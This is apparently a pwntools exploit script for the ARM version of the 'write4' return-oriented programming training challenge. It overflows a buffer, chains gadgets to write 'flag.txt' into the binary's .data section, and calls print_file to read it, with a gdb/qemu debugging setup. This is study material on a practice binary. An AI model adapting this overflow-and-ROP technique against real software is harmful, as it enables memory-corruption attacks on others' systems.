from pwn import *

context.arch = "arm"

elf = ELF("./write4_armv5")

gs = f"""
gef-remote --qemu-user --qemu-binary {elf.path} localhost 1234
file {elf.path}
b *pwnme+84
c
"""

io = process(["qemu-arm","-g","1234", elf.path])
gdb.attach(io, gdbscript=gs)

# lr register holds return address of a function call
str_r3_ptr_r4 = 0x000105ec # str r3, [r4] ; pop {r3, r4, pc}
pop_r3_r4 = 0x000105f0 # pop {r3, r4, pc}
pop_r0 = 0x000105f4 # pop {r0, pc}
hold_flag = 0x0021024 # .data __data_start: 4 null bytes rw
call_print_file = 0x00105dc

def write(to, what):
    return flat(
            pop_r3_r4,
            what,
            to,
            str_r3_ptr_r4,
            0xdeadbeef,
            0xdeadbeef
            )

io.sendline(b"A" * 36 + \
        write(hold_flag, "flag") + \
        write(hold_flag+4, ".txt") + \
        p32(pop_r0) + \
        p32(hold_flag) + \
        p32(call_print_file))


io.interactive()
